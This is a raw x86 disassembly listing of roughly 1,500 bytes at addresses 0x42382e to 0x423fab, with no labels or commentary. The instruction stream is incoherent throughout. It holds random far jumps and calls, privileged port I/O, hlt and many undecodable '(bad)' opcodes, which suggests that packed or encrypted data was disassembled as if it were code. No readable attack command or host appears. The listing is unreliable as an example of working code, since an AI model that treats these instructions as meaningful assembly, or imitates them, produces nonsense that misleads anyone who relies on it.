  42382e:	imul   ecx,DWORD PTR [esi],0xd4151411
  423834:	sar    cl,cl
  423836:	js     0x4238a5
  423838:	lock test BYTE PTR [ebx+0x63da8057],ah
  42383f:	mov    ah,0x21
  423841:	mov    dh,0xba
  423843:	lods   eax,DWORD PTR ds:[esi]
  423844:	mov    DWORD PTR [eax],eax
  423846:	mov    ebp,0x671bbe6a
  42384b:	jecxz  0x4237db
  42384d:	pop    es
  42384e:	sub    al,0x7
  423850:	push   edx
  423851:	pop    edi
  423852:	sbb    dl,0x14
  423855:	jmp    0xb5fe:0xe1b77dcc
  42385c:	mov    esp,0xd54214a9
  423861:	hlt    
  423862:	mov    esi,DWORD PTR [ecx+0x1b]
  423865:	adc    ch,BYTE PTR [eax]
  423867:	fdivr  st(5),st
  423869:	ret    0xade0
  42386c:	inc    esp
  42386d:	js     0x423805
  42386f:	mov    BYTE PTR [esi],0xb2
  423872:	push   ds
  423873:	dec    ebx
  423874:	xchg   edx,eax
  423875:	std    
  423876:	sbb    ch,BYTE PTR [ecx-0x34]
  423879:	aam    0x17
  42387b:	mov    ds:0xb7d79aa9,eax
  423880:	push   ebx
  423881:	dec    ecx
  423882:	or     ebp,edx
  423884:	cli    
  423885:	stos   DWORD PTR es:[edi],eax
  423886:	int3   
  423887:	mov    dh,0xfa
  423889:	pop    ds
  42388a:	add    al,0x70
  42388c:	push   ds
  42388d:	mov    ds:0x94a93a98,al
  423892:	cmp    al,0x5c
  423894:	push   cs
  423895:	add    BYTE PTR [edi+0x28076a5d],al
  42389b:	retf   0x1de0
  42389e:	imul   edx,DWORD PTR [esp+ecx*1-0x345aff51],0x6d
  4238a6:	cmp    DWORD PTR [edi+edi*2+0x56],0x6f
  4238ab:	int    0x83
  4238ad:	or     eax,0x196d56a0
  4238b2:	and    eax,0xb494950a
  4238b7:	pop    edi
  4238b8:	mov    ds:0x8be7d7d,al
  4238bd:	repz (bad) 
  4238bf:	adc    edx,esi
  4238c1:	mov    ebx,0x946f020a
  4238c6:	std    
  4238c7:	out    0x6a,eax
  4238c9:	xor    al,0x2e
  4238cb:	sar    ch,0xe3
  4238ce:	sbb    edx,ebp
  4238d0:	sbb    ebp,DWORD PTR [ebx+0x582bcff3]
  4238d6:	stos   BYTE PTR es:[edi],al
  4238d7:	pop    es
  4238d8:	pop    ss
  4238d9:	call   0x7c6e:0x70716220
  4238e0:	fld    DWORD PTR [ecx]
  4238e2:	ds mov dl,0xab
  4238e5:	arpl   WORD PTR [edi+0x78160f38],sp
  4238eb:	lahf   
  4238ec:	xchg   edx,eax
  4238ed:	dec    edx
  4238ee:	daa    
  4238ef:	sbb    eax,0x68b4a529
  4238f4:	stc    
  4238f5:	xchg   esp,eax
  4238f6:	mov    ebx,?
  4238f8:	and    ch,al
  4238fa:	out    dx,eax
  4238fb:	jecxz  0x423954
  4238fd:	jle    0x4238cc
  4238ff:	dec    edi
  423900:	jge    0x4238e7
  423902:	js     0x423899
  423904:	stos   BYTE PTR es:[edi],al
  423905:	add    al,BYTE PTR [eax]
  423907:	out    dx,al
  423908:	loopne 0x4238a0
  42390a:	pop    ebp
  42390b:	data16 and al,0x25
  42390e:	add    al,0x95
  423910:	imul   eax,DWORD PTR [edi-0x618b0851],0x786817e8
  42391a:	and    ebp,DWORD PTR [edx+edx*1+0x18af496e]
  423921:	(bad)  
  423922:	das    
  423923:	push   ecx
  423924:	int    0x62
  423926:	test   DWORD PTR [eax],0xeb86cd26
  42392c:	icebp  
  42392d:	xor    esp,DWORD PTR [esi+0x4f9ffc6e]
  423933:	xlat   BYTE PTR ds:[ebx]
  423934:	push   cs
  423935:	pop    edx
  423936:	xchg   edx,eax
  423937:	or     edx,DWORD PTR [eax]
  423939:	jb     0x4238e5
  42393b:	pop    edi
  42393c:	xchg   ebx,eax
  42393d:	jmp    DWORD PTR [eax-0x20]
  423940:	lods   al,BYTE PTR ds:[esi]
  423941:	mov    al,ds:0xaf1a8402
  423946:	cld    
  423947:	sahf   
  423948:	shl    ebx,1
  42394a:	xor    DWORD PTR [esp+ebx*4],ebp
  42394d:	nop
  42394e:	dec    ebx
  42394f:	inc    edx
  423950:	pop    edi
  423951:	sahf   
  423952:	adc    eax,0xba03cf2b
  423957:	sub    eax,0x52349bb7
  42395c:	std    
  42395d:	add    al,0xdc
  42395f:	inc    eax
  423960:	ficomp DWORD PTR [eax-0x30]
  423963:	xor    DWORD PTR [ebx],edx
  423965:	inc    edx
  423966:	sub    BYTE PTR ds:0x99523c55,ch
  42396c:	pop    ebx
  42396d:	repnz dec esp
  42396f:	mov    eax,ds:0xfe5b9bc0
  423974:	retf   
  423975:	retf   
  423976:	pop    edx
  423977:	nop
  423978:	sbb    eax,0xee901e33
  42397d:	dec    ebp
  42397e:	rol    BYTE PTR [ebp+0x78],0x55
  423982:	xchg   edx,eax
  423983:	sub    eax,0x2c4d30fe
  423988:	gs push ebp
  42398a:	repnz retf 0xed2d
  42398e:	and    esp,DWORD PTR [ebp+0x54]
  423991:	ins    DWORD PTR es:[edi],dx
  423992:	sbb    bl,BYTE PTR [esi+0x563f58d0]
  423998:	fimul  WORD PTR ds:0x2d4d3556
  42399e:	ret    0x841a
  4239a1:	call   0x5d1a:0xe559c737
  4239a8:	inc    BYTE PTR [edi-0x33]
  4239ab:	push   DWORD PTR [edx]
  4239ad:	jns    0x423a1e
  4239af:	xchg   edi,eax
  4239b0:	(bad)  
  4239b1:	pop    eax
  4239b2:	sub    DWORD PTR [edi+0x39],eax
  4239b5:	sbb    eax,0x16d6a68f
  4239ba:	or     eax,0x108cf60c
  4239bf:	into   
  4239c0:	jno    0x423948
  4239c2:	imul   ebp,DWORD PTR cs:[eax],0xffffff97
  4239c6:	xchg   ecx,eax
  4239c7:	sti    
  4239c8:	or     al,0x8c
  4239ca:	lods   eax,DWORD PTR ds:[esi]
  4239cb:	iret   
  4239cc:	sbb    edi,DWORD PTR [ecx]
  4239ce:	call   0xef87cb48
  4239d3:	popa   
  4239d4:	xchg   edi,eax
  4239d5:	and    ecx,DWORD PTR [ebp+ecx*2-0x49ab24ab]
  4239dc:	inc    edx
  4239dd:	arpl   ax,di
  4239df:	add    al,0x13
  4239e1:	scas   eax,DWORD PTR es:[edi]
  4239e2:	sbb    cl,ah
  4239e4:	pop    ecx
  4239e5:	daa    
  4239e6:	pusha  
  4239e7:	add    esp,DWORD PTR [edx-0x5919ed7b]
  4239ed:	imul   esp,DWORD PTR [edi],0x14
  4239f0:	pop    ss
  4239f1:	mov    ebp,0x2b99dfed
  4239f6:	jmp    0x93bd:0x7a1735f8
  4239fd:	repz cmp BYTE PTR [edi+0x2fc40d89],al
  423a04:	pop    eax
  423a05:	push   ebp
  423a06:	mov    BYTE PTR [ebx-0x51754880],cl
  423a0c:	mov    ebx,0xd0d44168
  423a11:	mov    ch,0xe9
  423a13:	int3   
  423a14:	push   eax
  423a15:	add    bl,BYTE PTR [ebx+0x2444738]
  423a1b:	(bad)  
  423a1c:	push   ecx
  423a1d:	pop    eax
  423a1e:	jne    0x423a4a
  423a20:	inc    edx
  423a21:	mov    ah,0xf2
  423a23:	push   ecx
  423a24:	test   al,0xa3
  423a26:	xchg   esp,eax
  423a27:	nop
  423a28:	adc    BYTE PTR ds:[ebx],ah
  423a2b:	repnz in al,dx
  423a2d:	inc    edx
  423a2e:	ss sub edx,esp
  423a31:	xchg   BYTE PTR [ebp+0x5605d5a4],al
  423a37:	scas   al,BYTE PTR es:[edi]
  423a38:	sub    al,dl
  423a3a:	xor    eax,0xa5f2acb9
  423a3f:	pop    ecx
  423a40:	in     al,dx
  423a41:	je     0x423a4d
  423a43:	(bad)  
  423a44:	pop    eax
  423a45:	sar    BYTE PTR [edi+ecx*1+0x6e],1
  423a49:	inc    esi
  423a4a:	cmp    BYTE PTR [eax+eiz*1+0x46bd7e2e],al
  423a51:	nop
  423a52:	clc    
  423a53:	mov    dl,0x73
  423a55:	test   edx,0xbdbfaf19
  423a5b:	adc    DWORD PTR [edx+0x6],eax
  423a5e:	mov    dl,0xf7
  423a60:	repnz or edi,DWORD PTR [ebx+0xae684a2]
  423a67:	mov    al,0x3e
  423a69:	rcr    DWORD PTR [ebp+0x5d],cl
  423a6c:	inc    esi
  423a6d:	div    DWORD PTR [esi]
  423a6f:	cli    
  423a70:	data16 sub dl,dh
  423a73:	sub    cl,BYTE PTR [edx+0x5f]
  423a76:	pop    edx
  423a77:	mov    ch,0xf9
  423a79:	mov    bh,0x9
  423a7b:	ret    
  423a7c:	jae    0x423a6f
  423a7e:	push   ebp
  423a7f:	sub    al,0x37
  423a81:	cmp    edi,DWORD PTR [edi+ebx*2]
  423a84:	shl    al,1
  423a86:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423a87:	xlat   BYTE PTR ds:[ebx]
  423a88:	adc    esi,DWORD PTR [edi]
  423a8a:	data16 cmc 
  423a8c:	outs   dx,BYTE PTR ds:[esi]
  423a8d:	repz (bad) 
  423a91:	pop    esp
  423a92:	pop    edx
  423a93:	fcomp  DWORD PTR [edx+edx*4]
  423a96:	mov    esi,DWORD PTR [esi+0x5f5be5b7]
  423a9c:	xchg   esi,eax
  423a9d:	and    esp,DWORD PTR [ecx+0x79]
  423aa0:	mov    bh,0x97
  423aa2:	les    ebp,FWORD PTR [ebx+0x78]
  423aa5:	test   BYTE PTR [eax],0xe
  423aa8:	jae    0x423ad3
  423aaa:	test   al,0x35
  423aac:	lea    esp,[ecx]
  423aae:	retf   
  423aaf:	pusha  
  423ab0:	ja     0x423ae9
  423ab2:	inc    ebp
  423ab3:	jg     0x423a92
  423ab5:	inc    edx
  423ab6:	cwde   
  423ab7:	and    eax,0x92db4a92
  423abc:	(bad)  [edi+0x7b]
  423abf:	in     eax,dx
  423ac0:	jg     0x423ae5
  423ac2:	stos   BYTE PTR es:[edi],al
  423ac3:	ins    DWORD PTR es:[edi],dx
  423ac4:	jbe    0x423aac
  423ac6:	push   es
  423ac7:	mov    ds:0x27ab6c19,al
  423acc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423acd:	scas   eax,DWORD PTR es:[edi]
  423ace:	aam    0xb4
  423ad0:	sbb    BYTE PTR [esi-0x7ce667bb],ah
  423ad6:	clc    
  423ad7:	loopne 0x423aff
  423ad9:	adc    eax,0x1c5c5d38
  423ade:	call   0xd2d7aba6
  423ae3:	ins    BYTE PTR es:[edi],dx
  423ae4:	jmp    ecx
  423ae6:	ss pop esi
  423ae8:	je     0x423b68
  423aea:	int    0x67
  423aec:	fcomp  DWORD PTR [ecx+ebx*8-0x39]
  423af0:	das    
  423af1:	lahf   
  423af2:	loop   0x423b50
  423af4:	mov    ebp,0x559dc626
  423af9:	out    dx,al
  423afa:	shr    BYTE PTR [eax+ebx*2+0x147561cc],cl
  423b01:	xchg   ebp,eax
  423b02:	shl    BYTE PTR [edi],0xd5
  423b05:	jns    0x423b18
  423b07:	sahf   
  423b08:	cmp    BYTE PTR [ecx+esi*1-0x51b96c35],ch
  423b0f:	cmp    eax,0xcbe89a5a
  423b14:	push   esi
  423b15:	fst    DWORD PTR [ebp-0x56]
  423b18:	mov    ah,0x4
  423b1a:	stos   DWORD PTR es:[edi],eax
  423b1b:	jl     0x423b17
  423b1d:	out    0x3a,al
  423b1f:	(bad)  
  423b20:	dec    edx
  423b21:	fimul  WORD PTR [ebx+0x7e]
  423b24:	test   eax,0x52599daf
  423b29:	frstor [ebp-0x9944a74]
  423b2f:	scas   al,BYTE PTR es:[edi]
  423b30:	fild   WORD PTR [ecx]
  423b32:	cwde   
  423b33:	cmp    ah,BYTE PTR [ecx+0x8d3a91d]
  423b39:	psubq  mm6,QWORD PTR [ebp-0x4ce4f1b7]
  423b40:	(bad)
  423b44:	outs   dx,DWORD PTR ds:[esi]
  423b45:	ds mov edi,0x81902063
  423b4b:	inc    edx
  423b4c:	(bad)  
  423b4d:	in     eax,0xf9
  423b4f:	sub    eax,0x4ecb9322
  423b54:	test   edi,esi
  423b56:	dec    ebx
  423b57:	ja     0x423b5e
  423b59:	mov    ah,BYTE PTR [esi-0x17725d78]
  423b5f:	retf   0x3eed
  423b62:	cmp    BYTE PTR [ecx],dl
  423b64:	in     al,dx
  423b65:	xlat   BYTE PTR ds:[ebx]
  423b66:	add    al,0x16
  423b68:	outs   dx,BYTE PTR ds:[esi]
  423b69:	sar    DWORD PTR [eax-0x3a],1
  423b6c:	add    BYTE PTR [esi-0x71e5393b],dl
  423b72:	test   DWORD PTR [ebp+0x3c877afd],ebx
  423b78:	test   DWORD PTR [ebx],ebx
  423b7a:	aas    
  423b7b:	fst    DWORD PTR [esi-0x4fee0db9]
  423b81:	cmc    
  423b82:	mov    ds:0xb4126c75,eax
  423b87:	cmp    ah,BYTE PTR cs:[edi]
  423b8a:	jb     0x423b42
  423b8c:	sbb    bh,BYTE PTR [edx+0x28]
  423b8f:	mov    dh,0x73
  423b91:	xchg   ebp,eax
  423b92:	inc    ebp
  423b93:	daa    
  423b94:	inc    ebp
  423b95:	stc    
  423b96:	jns    0x423bb0
  423b98:	fidivr WORD PTR [edx+0x2e]
  423b9b:	inc    eax
  423b9c:	fidivr DWORD PTR [ecx]
  423b9e:	add    ecx,ebx
  423ba0:	jmp    0x89621b38
  423ba5:	ret    0x4b8b
  423ba8:	enter  0xef6f,0xc6
  423bac:	sub    dl,BYTE PTR [ecx-0x5a]
  423baf:	or     BYTE PTR ds:[edi-0x4a4528a9],ah
  423bb6:	and    edx,DWORD PTR [ebp+0x261d0a06]
  423bbc:	sub    DWORD PTR [ebp-0x6b],eax
  423bbf:	or     al,BYTE PTR [edx-0x1d]
  423bc2:	popa   
  423bc3:	sar    DWORD PTR [edx-0x4f],1
  423bc6:	out    dx,al
  423bc7:	push   ebx
  423bc8:	call   FWORD PTR [edx]
  423bca:	mov    bl,0xa2
  423bcc:	pushf  
  423bcd:	jns    0x423ba6
  423bcf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423bd0:	dec    ecx
  423bd1:	adc    BYTE PTR [edi-0x158288a6],bl
  423bd7:	mov    esp,0xb50ea816
  423bdc:	ins    BYTE PTR es:[edi],dx
  423bdd:	dec    edi
  423bde:	push   esp
  423bdf:	and    al,0xd6
  423be1:	cli    
  423be2:	dec    ebx
  423be3:	sbb    BYTE PTR [ecx-0x10d95c32],al
  423be9:	xor    esp,esi
  423beb:	mul    BYTE PTR [edx+0x70]
  423bee:	mov    bl,0xf4
  423bf0:	mov    edx,0xc2afd418
  423bf5:	ss push esp
  423bf7:	and    bh,BYTE PTR [edx-0x4976be5c]
  423bfd:	mov    ds:0x36f5f4d6,eax
  423c02:	aam    0x7f
  423c04:	dec    esi
  423c05:	pop    edi
  423c06:	pop    es
  423c07:	leave  
  423c08:	inc    eax
  423c09:	lds    edx,FWORD PTR [edx+0x56]
  423c0c:	jns    0x423bd5
  423c0e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423c0f:	cdq    
  423c10:	fisttp WORD PTR [ecx+0x6]
  423c13:	jae    0x423c50
  423c15:	jns    0x423c49
  423c17:	inc    ecx
  423c18:	push   ecx
  423c19:	jl     0x423bba
  423c1b:	cmp    ch,bh
  423c1d:	out    0xf5,al
  423c1f:	or     DWORD PTR [ebp-0x4e84ff62],esp
  423c25:	pop    ebp
  423c26:	mov    edx,0xc84de30
  423c2b:	xor    eax,0x8ffbf1eb
  423c30:	ds (bad) 
  423c32:	or     eax,0x7e058141
  423c37:	sar    BYTE PTR [edi+edi*4],1
  423c3a:	sbb    al,0xbe
  423c3c:	outs   dx,BYTE PTR ds:[esi]
  423c3d:	mov    cl,0xf9
  423c3f:	clc    
  423c40:	mov    WORD PTR [ebx-0xd],gs
  423c43:	jbe    0x423c6a
  423c45:	jge    0x423bd2
  423c47:	call   0xb4e0:0x9936d3d0
  423c4e:	push   ds
  423c4f:	jg     0x423c4e
  423c51:	pop    ebp
  423c52:	adc    al,0xa8
  423c54:	sub    ah,dl
  423c56:	add    ebp,esp
  423c58:	out    0xe3,eax
  423c5a:	xchg   edx,eax
  423c5b:	xlat   BYTE PTR ds:[ebx]
  423c5c:	jae    0x423c53
  423c5e:	add    al,0x2d
  423c60:	sbb    eax,0xd4bff5a9
  423c65:	cmp    BYTE PTR [eax-0x16],dl
  423c68:	adc    eax,0xca598477
  423c6d:	retf   
  423c6e:	add    ebx,DWORD PTR [ebx]
  423c70:	xchg   ebx,eax
  423c71:	push   esi
  423c72:	std    
  423c73:	add    eax,0xfc81551e
  423c78:	fild   DWORD PTR [edx]
  423c7a:	cdq    
  423c7b:	outs   dx,BYTE PTR ds:[esi]
  423c7c:	pop    edi
  423c7d:	mov    bl,0xb2
  423c7f:	xchg   esp,eax
  423c81:	loope  0x423c33
  423c83:	jle    0x423cfe
  423c85:	je     0x423c76
  423c87:	xchg   esp,eax
  423c88:	in     al,0xf
  423c8a:	loop   0x423ca5
  423c8c:	push   cs
  423c8d:	pop    edx
  423c8e:	jp     0x423c58
  423c90:	js     0x423cee
  423c92:	(bad)  
  423c94:	cmp    al,0xf9
  423c96:	and    BYTE PTR [ebx-0x1a],0xf6
  423c9a:	jnp    0x423cb4
  423c9c:	sub    DWORD PTR [ebp+0x65],ecx
  423c9f:	mov    dl,0x2f
  423ca1:	call   0x3d61bc2d
  423ca6:	ja     0x423c5d
  423ca8:	xchg   edx,eax
  423ca9:	jg     0x423cff
  423cab:	div    ah
  423cad:	pop    eax
  423cae:	and    esp,DWORD PTR [esi+ebx*4]
  423cb1:	pop    ebp
  423cb2:	or     dh,BYTE PTR [ecx+esi*8+0x6b03f47e]
  423cb9:	pop    es
  423cba:	out    dx,eax
  423cbb:	cmp    bh,BYTE PTR [eax]
  423cbd:	out    0x8e,eax
  423cbf:	mov    esi,0x2f1f15f2
  423cc4:	les    edx,FWORD PTR [eax+0xd3e6f3e]
  423cca:	iret   
  423ccb:	xchg   edx,eax
  423ccc:	out    dx,eax
  423ccd:	lods   al,BYTE PTR ds:[esi]
  423cce:	test   eax,0x864db8db
  423cd3:	mov    edx,0x28d58779
  423cd8:	dec    eax
  423cd9:	in     eax,0x84
  423cdb:	mov    eax,0x990827e6
  423ce0:	inc    esi
  423ce1:	sti    
  423ce2:	cs or  eax,0x1ee422fb
  423ce8:	cld    
  423ce9:	add    ah,ch
  423ceb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423cec:	inc    edx
  423ced:	rcl    DWORD PTR [esi+0x35a45ef3],0x7b
  423cf4:	mov    esp,0x961ba53b
  423cf9:	mov    bh,0x5b
  423cfb:	mov    dh,0x1c
  423cfd:	(bad)  
  423cff:	lea    ebp,[ecx-0x52]
  423d02:	popf   
  423d03:	ss aam 0x5a
  423d06:	clc    
  423d07:	stos   DWORD PTR es:[edi],eax
  423d08:	dec    edx
  423d09:	outs   dx,BYTE PTR ds:[esi]
  423d0a:	sbb    eax,0xe62fbe88
  423d0f:	call   FWORD PTR [edi-0x4]
  423d12:	fild   DWORD PTR [edi]
  423d14:	mov    ch,0xac
  423d16:	push   ss
  423d17:	shl    esp,0xec
  423d1a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423d1b:	add    eax,0x1d971016
  423d20:	dec    eax
  423d21:	pop    ebp
  423d22:	outs   dx,BYTE PTR ds:[esi]
  423d23:	jg     0x423cc0
  423d25:	jmp    0x423cf5
  423d27:	mov    bh,0x50
  423d29:	xchg   DWORD PTR [edx+edx*2+0x57],eax
  423d2d:	push   ebp
  423d2e:	push   edi
  423d2f:	push   ebp
  423d30:	inc    esi
  423d31:	push   ebx
  423d32:	test   BYTE PTR [eax-0x59420192],ah
  423d38:	xchg   edi,eax
  423d39:	xchg   DWORD PTR [eax-0x77fffe35],esi
  423d3f:	push   es
  423d40:	add    BYTE PTR [eax],al
  423d42:	js     0x423d6b
  423d44:	mov    cl,0x99
  423d46:	cwde   
  423d47:	push   ecx
  423d48:	mov    dl,0xdd
  423d4a:	sbb    DWORD PTR [edi],eax
  423d4c:	mov    BYTE PTR [ecx+ecx*1-0x60],cl
  423d50:	repnz push ecx
  423d52:	outs   dx,DWORD PTR ds:[esi]
  423d53:	cdq    
  423d54:	test   edi,edi
  423d56:	dec    esp
  423d57:	pop    edx
  423d58:	lods   eax,DWORD PTR ds:[esi]
  423d59:	adc    BYTE PTR [edx],cl
  423d5b:	xlat   BYTE PTR ds:[ebx]
  423d5c:	adc    al,bl
  423d5e:	cmp    esi,DWORD PTR [edx-0x53]
  423d61:	into   
  423d62:	test   BYTE PTR [esi-0x1d7af06e],dh
  423d68:	lahf   
  423d69:	add    al,0x4d
  423d6b:	(bad)  
  423d6c:	sti    
  423d6d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423d6e:	imul   eax,DWORD PTR [ebx+0x60],0xffffffe4
  423d72:	add    cl,ah
  423d74:	fidiv  DWORD PTR [eax-0x423acae0]
  423d7a:	pop    ebp
  423d7b:	dec    ebp
  423d7c:	mov    edi,0xc2111eea
  423d81:	sbb    eax,0x6461064d
  423d86:	jl     0x423dfd
  423d88:	(bad)  
  423d89:	cld    
  423d8a:	fimul  DWORD PTR [eax]
  423d8c:	lods   eax,DWORD PTR ds:[esi]
  423d8d:	xlat   BYTE PTR ds:[ebx]
  423d8e:	pop    ecx
  423d8f:	xchg   ebx,eax
  423d90:	daa    
  423d91:	clc    
  423d92:	sub    eax,0xc9d2a912
  423d97:	inc    esp
  423d98:	lea    ecx,[eax-0x6a]
  423d9b:	dec    eax
  423d9c:	arpl   sp,cx
  423d9e:	ret    0x47e3
  423da1:	(bad)  
  423da2:	sti    
  423da3:	jg     0x423d95
  423da5:	test   ebx,ecx
  423da7:	aad    0x8c
  423da9:	or     eax,0x5591602
  423dae:	ret    0x633a
  423db1:	dec    esp
  423db2:	test   DWORD PTR ds:0x3ef48e5e,edi
  423db8:	xchg   edi,eax
  423db9:	or     DWORD PTR [esi+0x53],0x45763046
  423dc0:	push   0x88a72ada
  423dc5:	scas   al,BYTE PTR es:[edi]
  423dc6:	scas   eax,DWORD PTR es:[edi]
  423dc7:	pop    eax
  423dc8:	ret    
  423dc9:	cmp    DWORD PTR [eax-0x45],edx
  423dcc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423dcd:	inc    eax
  423dce:	(bad)  
  423dcf:	retf   
  423dd0:	mul    DWORD PTR [ecx-0x486e4ba1]
  423dd6:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  423dd8:	loopne 0x423e33
  423dda:	daa    
  423ddb:	or     BYTE PTR [ecx+esi*4],bh
  423dde:	mov    dl,0xf6
  423de0:	or     eax,0x6573cf74
  423de5:	es dec edx
  423de7:	sub    BYTE PTR [ebx+0x3a],0xab
  423deb:	cmp    esp,DWORD PTR [esi+0x64]
  423dee:	jl     0x423e59
  423df0:	fisttp QWORD PTR [eax]
  423df2:	mov    esp,0x3d07af28
  423df7:	test   DWORD PTR [ebx+0x37],ebx
  423dfa:	mov    cl,0x34
  423dfc:	dec    ebx
  423dfd:	sbb    al,0x46
  423dff:	xchg   ecx,eax
  423e00:	mov    ecx,0xf2343815
  423e05:	cli    
  423e06:	jmp    0x423e06
  423e08:	dec    edi
  423e09:	jle    0x423ddc
  423e0b:	pop    edx
  423e0c:	push   0x9
  423e0e:	or     ebp,DWORD PTR [edi+0x6b]
  423e11:	sub    bh,bh
  423e13:	and    BYTE PTR [esi+0x6b],bh
  423e16:	scas   eax,DWORD PTR es:[edi]
  423e17:	sbb    ah,0x4
  423e1a:	inc    esi
  423e1b:	mov    dh,0xa9
  423e1d:	xor    BYTE PTR [ebp+0x6464c82e],al
  423e23:	dec    esi
  423e24:	daa    
  423e25:	scas   al,BYTE PTR es:[edi]
  423e26:	pop    edi
  423e27:	add    edx,DWORD PTR [edx+0x6824fda4]
  423e2d:	dec    eax
  423e2e:	push   es
  423e2f:	xor    BYTE PTR [ecx],cl
  423e31:	je     0x423e98
  423e33:	arpl   ax,ax
  423e35:	push   ebp
  423e36:	in     al,0x24
  423e38:	sbb    BYTE PTR [ebx],ah
  423e3a:	jns    0x423e3a
  423e3c:	mov    bh,0xa9
  423e3e:	mov    ah,0xa5
  423e40:	mov    ch,0x95
  423e42:	cmp    eax,0x66f73d1f
  423e47:	(bad)  
  423e48:	mov    dh,0xdb
  423e4a:	rcl    ch,0x13
  423e4d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423e4e:	push   edx
  423e4f:	pop    esp
  423e50:	xchg   DWORD PTR [ebx+0x7],ecx
  423e53:	jb     0x423e2c
  423e55:	xchg   ebp,eax
  423e56:	push   ebx
  423e57:	mov    edx,DWORD PTR [eax+0x4931cf9a]
  423e5d:	sbb    eax,0xee966e30
  423e62:	imul   ecx,esp,0xffffffee
  423e65:	mov    al,ds:0xc374bfc
  423e6a:	fild   DWORD PTR ds:0x61b4e783
  423e70:	les    esp,FWORD PTR [edi+0x6233fb82]
  423e76:	xor    BYTE PTR [eax+eiz*1+0x53],0x23
  423e7b:	out    dx,al
  423e7c:	mov    ds:0x584a1259,al
  423e81:	xchg   esi,eax
  423e82:	int3   
  423e83:	test   DWORD PTR [ebx+0x791fa048],edi
  423e89:	push   ebx
  423e8a:	push   esi
  423e8b:	sub    esi,ecx
  423e8d:	jo     0x423e2e
  423e8f:	mov    ebx,0x4a79844a
  423e94:	rcr    BYTE PTR [edi],0x8f
  423e97:	jle    0x423ee7
  423e99:	push   cs
  423e9a:	add    al,0x1e
  423e9c:	int3   
  423e9d:	sub    ch,ah
  423e9f:	push   es
  423ea0:	repz fiadd WORD PTR [ecx+esi*8]
  423ea4:	iret   
  423ea5:	test   al,0x8c
  423ea7:	pop    ebx
  423ea8:	test   al,0x19
  423eaa:	push   edx
  423eab:	outs   dx,BYTE PTR ds:[esi]
  423eac:	call   0xd45c48fe
  423eb1:	dec    ebx
  423eb2:	jno    0x423f26
  423eb4:	pop    eax
  423eb5:	test   al,0x94
  423eb7:	jmp    0x423f1f
  423eb9:	and    edi,edi
  423ebb:	daa    
  423ebc:	xchg   esp,eax
  423ebd:	add    al,0xed
  423ebf:	outs   dx,DWORD PTR ds:[esi]
  423ec0:	dec    eax
  423ec1:	std    
  423ec2:	push   0x13
  423ec4:	ret    0xa6b4
  423ec7:	dec    edi
  423ec8:	push   cs
  423ec9:	xchg   BYTE PTR [edx],bl
  423ecb:	or     BYTE PTR [esi+0x2b14d143],bl
  423ed1:	mov    bl,0xb
  423ed3:	adc    bh,BYTE PTR [ecx]
  423ed5:	arpl   WORD PTR [ebp+0x4dae01d0],bx
  423edb:	mov    cl,0xf7
  423edd:	pop    edi
  423ede:	call   0x195fea33
  423ee3:	out    0xa7,eax
  423ee5:	sbb    BYTE PTR [esi+edi*2+0x77],al
  423ee9:	inc    eax
  423eea:	push   0xffffffe1
  423eec:	into   
  423eed:	dec    eax
  423eee:	ja     0x423e86
  423ef0:	ret    0xb531
  423ef3:	mov    esi,0x2c0a777a
  423ef8:	icebp  
  423ef9:	in     al,dx
  423efa:	xchg   DWORD PTR [ecx+0x58061306],edx
  423f00:	in     al,0x7a
  423f02:	xchg   ebx,eax
  423f03:	stc    
  423f04:	xor    BYTE PTR [esi],bh
  423f06:	hlt    
  423f07:	fstp   DWORD PTR [edx+ebp*2]
  423f0a:	dec    eax
  423f0b:	push   ebp
  423f0c:	mov    bl,0x20
  423f0e:	mov    bh,0xcb
  423f10:	jno    0x423f09
  423f12:	fnstenv [ebx-0x5eeb972c]
  423f18:	push   cs
  423f19:	bound  edx,QWORD PTR [ebx+0x58]
  423f1c:	lds    edi,FWORD PTR [eax+ecx*8-0x69694883]
  423f23:	bnd jp 0x423eb8
  423f26:	xchg   ebp,eax
  423f27:	std    
  423f28:	fsubr  st(0),st
  423f2a:	std    
  423f2b:	push   ecx
  423f2c:	xchg   edx,eax
  423f2d:	pop    edi
  423f2e:	cmp    BYTE PTR [ebx-0x7f],ah
  423f31:	mov    cs,edx
  423f33:	push   ss
  423f34:	in     eax,0xa0
  423f36:	mov    bh,0x2f
  423f38:	scas   eax,DWORD PTR es:[edi]
  423f39:	push   ds
  423f3a:	sbb    edx,ebx
  423f3c:	cmp    DWORD PTR [ecx+eiz*2-0x2c4be09c],0xffffffa4
  423f44:	mov    ah,0x93
  423f46:	stc    
  423f47:	sbb    edx,ebp
  423f49:	std    
  423f4a:	imul   esi,edx,0x67ee7fbe
  423f50:	js     0x423edb
  423f52:	mov    DWORD PTR [ecx-0x4d],esp
  423f55:	adc    al,0xba
  423f57:	or     DWORD PTR [edi+0x9],0xffffffff
  423f5b:	aaa    
  423f5c:	retf   0x7d06
  423f5f:	cdq    
  423f60:	and    edi,DWORD PTR [ebp-0x47]
  423f63:	adc    DWORD PTR [edx+0x36d5fb84],esp
  423f69:	mov    eax,edx
  423f6b:	scas   al,BYTE PTR es:[edi]
  423f6c:	js     0x423ef4
  423f6e:	sahf   
  423f6f:	repnz out dx,eax
  423f71:	pop    esi
  423f72:	xchg   esp,eax
  423f73:	fwait
  423f74:	pop    ss
  423f75:	mov    esi,0x75f6a6c2
  423f7a:	gs mov edx,0xd0d82c5
  423f80:	mov    ebp,0x7543bf15
  423f85:	not    DWORD PTR [eax-0x577a3306]
  423f8b:	ja     0x423fe9
  423f8d:	xchg   esp,eax
  423f8e:	fisubr WORD PTR [eax+0xe591099]
  423f94:	or     al,0x7d
  423f96:	cli    
  423f97:	mov    esi,DWORD PTR [eax-0x5cf19c19]
  423f9d:	push   ebp
  423f9e:	sbb    eax,0xffffffc2
  423fa1:	sub    DWORD PTR [ebx+esi*2],esp
  423fa4:	les    eax,FWORD PTR [edx+0x4530eab8]
  423faa:	cld    
  423fab:	sbb    edi,DWORD PTR [ebp+0x59]
